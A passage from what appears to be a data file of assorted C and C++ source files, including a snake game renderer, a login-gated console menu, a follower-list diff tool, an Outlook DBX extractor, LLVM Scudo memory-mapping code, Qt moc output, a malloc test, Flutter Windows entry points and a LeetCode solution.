mudan\u00e7as feitas.\n *\n * @param state O estado atual do jogo a ser renderizado.\n * @param foodRequired N\u00famero total de comidas que devem ser consumidas para completar o jogo.\n */\nvoid renderGame(const GameState& state, int foodRequired) {\n    clear(); \n\n    mvprintw(0, 0, \"Lives: %d | Score: %d | Food eaten: %d of %d\", state.lives, state.foodCounter * 10, state.foodCounter, foodRequired);\n\n    for (int y = 0; y < state.height; y++) {\n        for (int x = 0; x < state.width; x++) {\n            if (x == state.food.x && y == state.food.y) {\n                mvprintw(y + 1, x, \"F\");\n            } else if (state.grid[y][x] == '#') {\n                mvprintw(y + 1, x, \"#\");\n            } else {\n               ",
    "#include \"header.h\"\n\nusing namespace std;\n\nint main() {\n    setlocale(LC_ALL, \"RU_ru.UTF-8\");\n    SetConsoleCP(CP_UTF8);\n    SetConsoleOutputCP(CP_UTF8);\n\n    AuthenticationLibrary authLib;\n\n    // \u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\n    UserCredentials* user = authLib.registration();\n\n    // \u0410\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0439 \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u0438\n    if (user != nullptr && authLib.authorization(user)) {\n\n        // \u041c\u0435\u043d\u044e \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u043f\u043e\u0441\u043b\u0435 \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u0438\n        int choice = 0;\n        do {\n            cout << \"\\n\";\n            cout << \"\u041c\u0435\u043d\u044e: \\n\";\n            cout << \"1. \u0412\u0432\u043e\u0434 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430 \\n\";\n            cout << \"2. \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0441\u0438\u0441\u0442\u0435\u043c\u044b \\n\";\n            cout << \"3. \u0412\u044b\u0445\u043e\u0434 \\n\";\n            cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0432\u043e\u0439 \u0432\u044b\u0431\u043e\u0440: \";\n            while (!(cin >> choice)) {\n                cout << \"\u041e\u0448\u0438\u0431\u043a\u0430: \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e. \\n\";\n                cin.clear();\n                cin.ignore((std::numeric_limits<std::streamsize>::max)(), '\\n'); // ignore\n                cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u043f\u0443\u043d\u043a\u0442 \u043c\u0435\u043d\u044e: \";\n            }\n            cout << \"\\n\";\n\n            switch (choice) \n            {\n                case 1: {\n                    // \u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430\n                    string otherParam = authLib.requestOtherParameters();\n                    cout << \"\u041f\u043e\u043b\u0443\u0447\u0435\u043d \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0439 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440: \" << otherParam << endl;\n                    break;\n                }\n                case 2: {\n                    // \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0441\u0438\u0441\u0442\u0435\u043c\u044b\n                    cout << std::system(\"systeminfo\") << endl;\n                    break;\n                }\n                case 3: {\n                    // \u0412\u044b\u0445\u043e\u0434 \u0438\u0437 \u043c\u0435\u043d\u044e.\n                    cout << \"\u0412\u044b\u0445\u043e\u0434... \\n\";\n                    delete user;\n                    break;\n                }\n                default:\n                    cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440. \\n\";\n                    break;\n            }  \n        } while (choice != 3);\n    }\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <unordered_set>\r\n\r\nusing namespace std;\r\n\r\nvoid loadFollowers(const string& filename, unordered_set<string>& followers) {\r\n    ifstream file(filename);\r\n    string line;\r\n\r\n    while (getline(file, line)) {\r\n        // Check if the line does not contain 'profile picture'\r\n        if (line.find(\"profile picture\") == string::npos && !line.empty()) {\r\n            followers.insert(line);\r\n        }\r\n    }\r\n    file.close();\r\n}\r\n\r\nint main() {\r\n    unordered_set<string> dfltFollowers;\r\n    unordered_set<string> newFollowers;\r\n\r\n    // Load default followers\r\n    loadFollowers(\"deflt.txt\", dfltFollowers);\r\n    \r\n    // Load new followers\r\n    loadFollowers(\"new.txt\", newFollowers);\r\n\r\n    // Open result files\r\n    ofstream newFollowersFile(\"result.txt\");\r\n    if (!newFollowersFile.is_open()) {\r\n        cerr << \"Failed to open result.txt for writing.\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    ofstream unfollowedFile(\"unfollowed.txt\");\r\n    if (!unfollowedFile.is_open()) {\r\n        cerr << \"Failed to open unfollowed.txt for writing.\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    // Write new followers to result.txt\r\n    newFollowersFile << \"New followers:\" << endl;\r\n    for (const auto& follower : newFollowers) {\r\n        if (dfltFollowers.find(follower) == dfltFollowers.end()) {\r\n            newFollowersFile << follower << endl;\r\n        }\r\n    }\r\n\r\n    // Write unfollowed users to unfollowed.txt\r\n    unfollowedFile << \"Unfollowed users:\" << endl;\r\n    for (const auto& follower : dfltFollowers) {\r\n        if (newFollowers.find(follower) == newFollowers.end()) {\r\n            unfollowedFile << follower << endl;\r\n        }\r\n    }\r\n\r\n    newFollowersFile.close();\r\n    unfollowedFile.close();\r\n    cout << \"New followers have been written to result.txt\" << endl;\r\n    cout << \"Unfollowed users have been written to unfollowed.txt\" << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "//\n//      Outlook Extract objects.\n//\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <direct.h>\n\n#include <malloc.h>\n#include <string.h>\n#include <stdarg.h>\n//#include <error.h>\n#include <errno.h>\n\n#include <process.h>\n#include <dos.h>\n#include <io.h>\n\n#include \"AutomaticVersionHeader.h\"\n\n#include \"OE5ExtractDefinitions.h\"\n\n#include \"TextRoutines.h\"\n#include \"MimeRoutines.h\"\n#include \"FileRoutines.h\"\n#include \"DisplayAndTrace.h\"\n#include \"DecodeRoutines.h\"\n#include \"RemoveStringsRoutines.h\"\n#include \"OEAddressRoutines.h\"\n#include \"OEMessagesRoutines.h\"\n#include \"DecodeRoutines.h\"\n\n\n//\n//      The file path.\nstatic  char                    szPathname [ LEN_PATHNAME ]         = \"\";\n\n//\n//      The destination drive.\nstatic  char                    szDestDrive [ LEN_PATHNAME ]        = \"\";\n\n//\n//      The destination directory.\nstatic  char                    szDestDirectory [ LEN_DIRECTORY ]   = \"\";\n\n\n//      Change directory\nstatic  bool                    bDirectory                          = false;\n\n//      Change disk only.\nstatic  bool                    bDiskDrive                          = false;\n\n//      Ok the argument are corrects.\nstatic  bool                    bFilename                           = false;\n\n//      Alter Name Only\nstatic  bool                    bAlterNameOnly                      = false;\n\n//      Remove directory\nstatic  bool                    bRemoveTrailingDirectory            = false;\nstatic  bool                    bRemoveLeadingDirectory             = false;\nstatic  bool                    bRemoveTrailingNumbers              = false;\n\n//      Modify type\nstatic  bool                    bModifyType                         = false;\nstatic  char                    szDefinedType [ LEN_FILETYPE ]      = \"\";\n\n//\n//      Prototypes.\nvoid RenameTreatDirectory ( const char *pWildName, char *pUpperDirectory );\n\n//\n//      Exit program.\nstatic void ExitProgram ( int iError )\n{\n    CloseDbxFile ( );\n\n    CloseAttFile ( );\n\n    CloseLogFile ( );\n\n    CloseMsgFile ( );\n\n#ifdef  _CONSOLE\n    exit ( iError );\n#endif\n\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//      Display usage and exit.\n//\n///////////////////////////////////////////////////////////////////////////////\nvoid DisplayUsageAndExit ( char *pCmd )\n{\n        DisplayText ( \"Usage is %s [-options] [-options] [-f ] filename\\n\", pCmd );\n        DisplayText ( \"Where options is one or more command modifiers:\\n\" );\n        DisplayText ( \"-a   or -alternameonly to rename files only\\n\" );\n        DisplayText ( \"-c   or -collapse to collapse spaces on final name\\n\" );\n        DisplayText ( \"-d   or -disk to set the destination disk (ex: -d E:)\\n\" );\n        DisplayText ( \"-f   or -file to specify input file (ex: -f c:\\\\temp\\\\newsfolder.dbx)\\n\" );\n        DisplayText ( \"-h   or -help to display this text\\n\" );\n        DisplayText ( \"-k   or -keep to keep intermediate files (.nws files)\\n\" );\n        DisplayText ( \"-l   or -leave do not overwrite existing files\\n\" );\n        DisplayText ( \"-m   or -modifytype set the file type (ex: -m .mid)\\n\" );\n        DisplayText ( \"-n   or -name set the file name as the name of the attachement\\n\" );\n        DisplayText ( \"-o   or -onlymessages (no attachement extraction)\\n\" );\n        DisplayText ( \"-p   or -path to set the destination directory (ex: -D F:\\\\TEMP)\\n\" );\n        DisplayText ( \"-rld or -removeleadingdirectory remove directory inside the name\\n\" );\n        DisplayText ( \"-rn  or -removenumbers remove numbers from the name\\n\" );\n        DisplayText ( \"-ro  or -removeother remove other signs from the name\\n\" );\n        DisplayText ( \"-rs  or -removestring remove a string from the name (ex: -rs \\\"string 1\\\")\\n\" );\n        DisplayText ( \"-rtd or -removetrailingdirectory remove directory inside the name\\n\" );\n        DisplayText ( \"-rtn or -removetrailingnumbers remove trailing numbers inside the name\\n\" );\n        DisplayText ( \"-s   or -subject set the name of the file as the subject of the message\\n\" );\n        DisplayText ( \"-t   or -trace to trace information on display\\n\" );\n        DisplayText ( \"-v   or -verbose to trace more information on display (use with -t)\\n\" );\n        DisplayText ( \"\\n\" );\n        DisplayText ( \"Example: %s c:\\\\temp\\\\newsfolder.dbx\\n\", pCmd );\n\n\n        ExitProgram ( 255 );\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//      Get arguments for program.\n//\n///////////////////////////////////////////////////////////////////////////////\nvoid GetArguments ( int nArgs, char *pArgs [] )\n{\n    //      A index\n    int             iX;\n\n    //      Say we have not all arguments.\n    bFilename           = false;\n\n    //      Reset flags\n    SetBoolTrace ( false );\n    SetBoolVerbose ( false );\n    SetBoolKeep ( false );\n    bDirectory                  = false;\n    bDiskDrive                  = false;\n    SetBoolLeave ( false );\n    SetBoolSubject ( false );\n    SetBoolName ( false );\n  ",
    "//===-- mem_map_linux.cpp ---------------------------------------*- C++ -*-===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n\n#include \"platform.h\"\n\n#if SCUDO_LINUX\n\n#include \"mem_map_linux.h\"\n\n#include \"common.h\"\n#include \"internal_defs.h\"\n#include \"linux.h\"\n#include \"mutex.h\"\n#include \"report_linux.h\"\n#include \"string_utils.h\"\n\n#include <errno.h>\n#include <fcntl.h>\n#include <linux/futex.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <sys/syscall.h>\n#include <sys/time.h>\n#include <time.h>\n#include <unistd.h>\n\n#if SCUDO_ANDROID\n// TODO(chiahungduan): Review if we still need the followings macros.\n#include <sys/prctl.h>\n// Definitions of prctl arguments to set a vma name in Android kernels.\n#define ANDROID_PR_SET_VMA 0x53564d41\n#define ANDROID_PR_SET_VMA_ANON_NAME 0\n#endif\n\nnamespace scudo {\n\nstatic void *mmapWrapper(uptr Addr, uptr Size, const char *Name, uptr Flags) {\n  int MmapFlags = MAP_PRIVATE | MAP_ANONYMOUS;\n  int MmapProt;\n  if (Flags & MAP_NOACCESS) {\n    MmapFlags |= MAP_NORESERVE;\n    MmapProt = PROT_NONE;\n  } else {\n    MmapProt = PROT_READ | PROT_WRITE;\n  }\n#if defined(__aarch64__)\n#ifndef PROT_MTE\n#define PROT_MTE 0x20\n#endif\n  if (Flags & MAP_MEMTAG)\n    MmapProt |= PROT_MTE;\n#endif\n  if (Addr)\n    MmapFlags |= MAP_FIXED;\n  void *P =\n      mmap(reinterpret_cast<void *>(Addr), Size, MmapProt, MmapFlags, -1, 0);\n  if (P == MAP_FAILED) {\n    if (!(Flags & MAP_ALLOWNOMEM) || errno != ENOMEM)\n      reportMapError(errno == ENOMEM ? Size : 0);\n    return nullptr;\n  }\n#if SCUDO_ANDROID\n  if (Name)\n    prctl(ANDROID_PR_SET_VMA, ANDROID_PR_SET_VMA_ANON_NAME, P, Size, Name);\n#else\n  (void)Name;\n#endif\n\n  return P;\n}\n\nbool MemMapLinux::mapImpl(uptr Addr, uptr Size, const char *Name, uptr Flags) {\n  void *P = mmapWrapper(Addr, Size, Name, Flags);\n  if (P == nullptr)\n    return false;\n\n  MapBase = reinterpret_cast<uptr>(P);\n  MapCapacity = Size;\n  return true;\n}\n\nvoid MemMapLinux::unmapImpl(uptr Addr, uptr Size) {\n  // If we unmap all the pages, also mark `MapBase` to 0 to indicate invalid\n  // status.\n  if (Size == MapCapacity) {\n    MapBase = MapCapacity = 0;\n  } else {\n    // This is partial unmap and is unmapping the pages from the beginning,\n    // shift `MapBase` to the new base.\n    if (MapBase == Addr)\n      MapBase = Addr + Size;\n    MapCapacity -= Size;\n  }\n\n  if (munmap(reinterpret_cast<void *>(Addr), Size) != 0)\n    reportUnmapError(Addr, Size);\n}\n\nbool MemMapLinux::remapImpl(uptr Addr, uptr Size, const char *Name,\n                            uptr Flags) {\n  void *P = mmapWrapper(Addr, Size, Name, Flags);\n  if (reinterpret_cast<uptr>(P) != Addr)\n    reportMapError();\n  return true;\n}\n\nvoid MemMapLinux::setMemoryPermissionImpl(uptr Addr, uptr Size, uptr Flags) {\n  int Prot = (Flags & MAP_NOACCESS) ? PROT_NONE : (PROT_READ | PROT_WRITE);\n  if (mprotect(reinterpret_cast<void *>(Addr), Size, Prot) != 0)\n    reportProtectError(Addr, Size, Prot);\n}\n\nvoid MemMapLinux::releaseAndZeroPagesToOSImpl(uptr From, uptr Size) {\n  void *Addr = reinterpret_cast<void *>(From);\n\n  while (madvise(Addr, Size, MADV_DONTNEED) == -1 && errno == EAGAIN) {\n  }\n}\n\nbool ReservedMemoryLinux::createImpl(uptr Addr, uptr Size, const char *Name,\n                                     uptr Flags) {\n  ReservedMemoryLinux::MemMapT MemMap;\n  if (!MemMap.map(Addr, Size, Name, Flags | MAP_NOACCESS))\n    return false;\n\n  MapBase = MemMap.getBase();\n  MapCapacity = MemMap.getCapacity();\n\n  return true;\n}\n\nvoid ReservedMemoryLinux::releaseImpl() {\n  if (munmap(reinterpret_cast<void *>(getBase()), getCapacity()) != 0)\n    reportUnmapError(getBase(), getCapacity());\n}\n\nReservedMemoryLinux::MemMapT ReservedMemoryLinux::dispatchImpl(uptr Addr,\n                                                               uptr Size) {\n  return ReservedMemoryLinux::MemMapT(Addr, Size);\n}\n\n} // namespace scudo\n\n#endif // SCUDO_LINUX\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'recharge.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.6.3)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../recharge.h\"\n#include <QtCore/qmetatype.h>\n\n#if __has_include(<QtCore/qtmochelpers.h>)\n#include <QtCore/qtmochelpers.h>\n#else\nQT_BEGIN_MOC_NAMESPACE\n#endif\n\n\n#include <memory>\n\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'recharge.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.6.3. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSrechargeENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSrechargeENDCLASS = QtMocHelpers::stringData(\n    \"recharge\",\n    \"on_sureButtom_clicked\",\n    \"\"\n);\n#else  // !QT_MOC_HAS_STRING_DATA\nstruct qt_meta_stringdata_CLASSrechargeENDCLASS_t {\n    uint offsetsAndSizes[6];\n    char stringdata0[9];\n    char stringdata1[22];\n    char stringdata2[1];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(sizeof(qt_meta_stringdata_CLASSrechargeENDCLASS_t::offsetsAndSizes) + ofs), len \nQ_CONSTINIT static const qt_meta_stringdata_CLASSrechargeENDCLASS_t qt_meta_stringdata_CLASSrechargeENDCLASS = {\n    {\n        QT_MOC_LITERAL(0, 8),  // \"recharge\"\n        QT_MOC_LITERAL(9, 21),  // \"on_sureButtom_clicked\"\n        QT_MOC_LITERAL(31, 0)   // \"\"\n    },\n    \"recharge\",\n    \"on_sureButtom_clicked\",\n    \"\"\n};\n#undef QT_MOC_LITERAL\n#endif // !QT_MOC_HAS_STRING_DATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSrechargeENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       1,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   20,    2, 0x08,    1 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject recharge::staticMetaObject = { {\n    QMetaObject::SuperData::link<QDialog::staticMetaObject>(),\n    qt_meta_stringdata_CLASSrechargeENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSrechargeENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSrechargeENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<recharge, std::true_type>,\n        // method 'on_sureButtom_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>\n    >,\n    nullptr\n} };\n\nvoid recharge::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<recharge *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->on_sureButtom_clicked(); break;\n        default: ;\n        }\n    }\n    (void)_a;\n}\n\nconst QMetaObject *recharge::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *recharge::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSrechargeENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return QDialog::qt_metacast(_clname);\n}\n\nint recharge::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QDialog::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 1)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 1;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 1)\n            *reinterpret_cast<QMetaType *>(_a[0]) = QMetaType();\n        _id -= 1;\n    }\n    return _id;\n}\nQT_WARNING_POP\n",
    "#include <chrono>\n#include <catch2/catch_test_macros.hpp>\n#include <iostream>\n\n#include <stdio.h>\n#include <stdlib.h>\n#ifdef __linux__\n#include <malloc.h> // For malloc_usable_size\n#endif\n\n/* https://x.com/lemire/status/1806429159255580981?t=8bKEufqy3piXd-4PYtIvhw&s=35 \n\n\u8bf7\u6c42\u5927\u5c0f\uff1amalloc \u5411\u64cd\u4f5c\u7cfb\u7edf\u8bf7\u6c42\u4e00\u4e2a\u81f3\u5c11 size \u5b57\u8282\u7684\u5185\u5b58\u5757\u3002\n\u989d\u5916\u5f00\u9500\uff1a\u5b9e\u9645\u5206\u914d\u7684\u5185\u5b58\u53ef\u80fd\u6bd4 size \u7a0d\u5927\u4e00\u4e9b\uff0c\u56e0\u4e3a\u5206\u914d\u5668\u9700\u8981\u4e00\u4e9b\u989d\u5916\u7684\u7a7a\u95f4\u6765\u7ba1\u7406\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u989d\u5916\u7684\u5f00\u9500\u53d6\u51b3\u4e8e\u5177\u4f53\u7684\u5185\u5b58\u5206\u914d\u5668\u5b9e\u73b0\u548c\u5e73\u53f0\u3002\n\u5bf9\u9f50\uff1a\u5206\u914d\u7684\u5185\u5b58\u5757\u901a\u5e38\u662f\u5bf9\u9f50\u7684\uff0c\u4ee5\u6ee1\u8db3\u7cfb\u7edf\u5185\u5b58\u5bf9\u9f50\u7684\u8981\u6c42\u3002\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u586b\u5145\uff08padding\uff09\u3002\n*/\n\nTEST_CASE(\"Simple malloc\", \"[vector]\") {\n    auto start = std::chrono::high_resolution_clock::now();\n\n    for (size_t size = 0; size < 100; size += 2)\n    {\n        void* ptr = malloc(size);\n\n        if (ptr == NULL) {\n            printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\\n\");\n        }\n\n        printf(\"\u5185\u5b58\u5206\u914d\u6210\u529f\\n\");\n\n    #ifdef __linux__\n        size_t actual_size = malloc_usable_size(ptr);\n        printf(\"\u8bf7\u6c42\u5927\u5c0f\uff1a%zu, \u5b9e\u9645\u5206\u914d\u5927\u5c0f\uff1a%zu\\n\", size, actual_size);\n    #endif\n\n        free(ptr);\n    }\n\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double, std::milli> elapsed = end - start;\n    std::cout << \"Test elapsed time: \" << elapsed.count() << \" ms\\n\";\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"july_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n\n\n2751. Robot Collisions\n\nThere are n 1-indexed robots, each having a position on a line, health, and movement direction.\n\nYou are given 0-indexed integer arrays positions, healths, and a string directions (directions[i] is either 'L' for left or 'R' for right). All integers in positions are unique.\n\nAll robots start moving on the line simultaneously at the same speed in their given directions. If two robots ever share the same position while moving, they will collide.\n\nIf two robots collide, the robot with lower health is removed from the line, and the health of the other robot decreases by one. The surviving robot continues in the same direction it was going. If both robots have the same health, they are both removed from the line.\n\nYour task is to determine the health of the robots that survive the collisions, in the same order that the robots were given, i.e. final heath of robot 1 (if survived), final health of robot 2 (if survived), and so on. If there are no survivors, return an empty array.\n\nReturn an array containing the health of the remaining robots (in the order they were given in the input), after no further collisions can occur.\n\nNote: The positions may be unsorted.\n\n \n \n\nExample 1:\n\n\n\nInput: positions = [5,4,3,2,1], healths = [2,17,9,15,10], directions = \"RRRRR\"\nOutput: [2,17,9,15,10]\nExplanation: No collision occurs in this example, since all robots are moving in the same direction. So, the health of the robots in order from the first robot is returned, [2, 17, 9, 15, 10].\nExample 2:\n\n\n\nInput: positions = [3,5,2,6], healths = [10,10,15,12], directions = \"RLRL\"\nOutput: [14]\nExplanation: There are 2 collisions in this example. Firstly, robot 1 and robot 2 will collide, and since both have the same health, they will be removed from the line. Next, robot 3 and robot 4 will collide and since robot 4's health is smaller, it gets removed, and robot 3's health becomes 15 - 1 = 14. Only robot 3 remains, so we return [14].\nExample 3:\n\n\n\nInput: positions = [1,2,5,6], healths = [10,10,11,11], directions = \"RLRL\"\nOutput: []\nExplanation: Robot 1 and robot 2 will collide and since both have the same health, they are both removed. Robot 3 and 4 will collide and since both have the same health, they are both removed. So, we return an empty array, [].\n \n\nConstraints:\n\n1 <= positions.length == healths.length == directions.length == n <= 105\n1 <= positions[i], healths[i] <= 109\ndirections[i] == 'L' or directions[i] == 'R'\nAll values in positions are distinct\n*/\nstruct Robot {\n  int index;\n  int position;\n  int health;\n  char direction;\n};\n\nclass Solution {\n public:\n  vector<int> survivedRobotsHealths(vector<int>& positions,\n                                    vector<int>& healths, string directions) {\n    vector<int> ans;\n    vector<Robot> robots;\n    vector<Robot> stack;  // the runnnig robots\n\n    for (int i = 0; i < positions.size(); ++i)\n      robots.push_back(Robot{i, positions[i], healths[i], directions[i]});\n\n    ranges::sort(robots, [](const Robot& a, const Robot& b) {\n      return a.position < b.position;\n    });\n\n    for (Robot& robot : robots) {\n      if (robot.direction == 'R') {\n        stack.push_back(robot);\n        continue;\n      }\n      // Collide with robots going right if any.\n      while (!stack.empty() && stack.back().direction == 'R' &&\n             robot.health > 0) {\n        if (stack.back().health == robot.health) {\n          stack.pop_back();\n          robot.health = 0;\n        } else if (stack.back().health < robot.health) {\n          stack.pop_back();\n          robot.health -= 1;\n        } else {  // stack.back().health > robot.health\n          stack.back().health -= 1;\n          robot.health = 0;\n        }\n      }\n      if (robot.health > 0)\n        stack.push_back(robot);\n    }\n\n    ranges::sort(stack, [](const Robot& a, const Robot& b) {\n      return a.index < b.index;\n    });\n\n    for (const Robot& robot : stack)\n      ans.push_back(robot.health);\n\n    return ans;\n  }\n};\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flyies\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
